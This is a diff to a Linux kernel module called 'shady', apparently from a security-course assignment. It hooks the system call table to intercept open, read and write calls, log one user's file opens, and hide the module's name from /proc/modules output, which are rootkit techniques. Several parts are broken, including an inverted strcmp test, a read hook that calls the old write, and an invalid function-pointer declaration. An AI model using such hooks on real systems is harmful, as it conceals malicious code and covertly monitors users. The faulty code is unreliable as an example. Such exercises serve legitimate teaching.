@@ -29,7 +29,10 @@
 #include <linux/device.h>
 #include <linux/mutex.h>
 #include <linux/unistd.h>
+//my includes
 #include <linux/cred.h>
+#include <linux/string.h>
+//end
 
 #include <asm/uaccess.h>
 
@@ -55,7 +58,9 @@ static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
 /* ================================================================ */
 
-//more stuff rom assignment description
+//my variables
+int read_check_flag=0;
+
 asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage ssize_t (*old_write) (int fd, const void *buf, size_t count);
 asmlinkage ssize_t (*old_read) (int fd, const void *buf, size_t count);
@@ -86,23 +91,30 @@ asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
 
 asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
 {
-     int i;
-     int searchIndex = 0;
-     int searchLength = 5;
-     char searchText[] = "shady";
-     for(i=0; i<count; i++)
+     if(read_check_flag)
      {
-          if(((char*)buf)[i]==searchText[searchIndex])
+          char nameBuffer[13];
+          char* filename = "/proc/modules";
+          int i;
+          int searchIndex = 0;
+          int searchLength = 5;
+          char searchText[] = "shady";
+          (*readlink_ptr)(const char *path, char *buf, size_t bufsiz) = ((unsigned long **)system_call_table_address)[__NR_readlink];
+          //readlink_ptr("")
+          for(i=0; i<count; i++)
           {
-               searchIndex++;
-               if(searchIndex==searchLength)
+               if(((char*)buf)[i]==searchText[searchIndex])
                {
-                    return count;
+                    searchIndex++;
+                    if(searchIndex==searchLength)
+                    {
+                         return count;
+                    }
                }
-          }
-          else
-          {
-               searchIndex=0;
+               else
+               {
+                    searchIndex=0;
+               }
           }
      }
      return old_write(fd, buf, count);
@@ -111,9 +123,14 @@ asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
 
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
+     char* test = "/proc/modules";
      kuid_t marks_kuid;
      marks_kuid.val = marks_uid;
      /* YOUR CODE HERE */
+     if(strcmp(file, test))
+     {
+          read_check_flag=1;
+     }
      if(uid_eq(get_current_cred()->uid, marks_kuid))
      {
           printk("mark is about to open \'%s\'\n", file);
